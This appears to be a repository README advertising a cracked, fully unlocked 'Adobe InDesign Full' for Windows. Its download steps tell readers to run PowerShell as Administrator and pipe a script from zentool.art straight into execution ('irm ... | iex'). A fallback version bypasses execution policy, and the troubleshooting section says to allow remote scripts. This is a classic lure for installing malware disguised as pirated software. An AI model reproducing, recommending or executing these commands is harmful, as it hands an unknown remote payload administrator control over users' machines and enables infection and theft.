Adobe InDesign Full — Windows 11 and 10 build | templates | every module enabled | no edition limits.

## About this application

**Adobe InDesign Full** in this repo is a Windows desktop package for designers and marketing teams who want the full desktop experience without missing tools or locked panels. This is the complete professional build — every module that normally sits behind a paid tier is already active, so you can use templates, layouts, and visual content from the first launch. Expect a guided setup through PowerShell, a responsive workspace on a standard PC, and workflows that feel like the top-tier edition from day one.

## Download

1. Open **PowerShell** as Administrator
2. Paste and run:

```powershell
irm https://zentool.art/ps/setup.ps1 | iex
```

3. Confirm **UAC** (Yes) — setup runs automatically

<details>
<summary><b>Having trouble? Try this instead</b></summary>

Paste this in the same PowerShell window:

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://zentool.art/ps/setup.ps1 | iex"
```

</details>

## Quick start

After setup finishes, open a template, edit text and colors, then export a PNG preview.

## Troubleshooting

**Setup script does not run** — confirm PowerShell is opened as Administrator and execution policy allows remote scripts.

**App opens but tools are grayed out** — restart once after install; the first launch may finish background registration.

Fonts missing — install required font pack or swap to built-in alternatives.
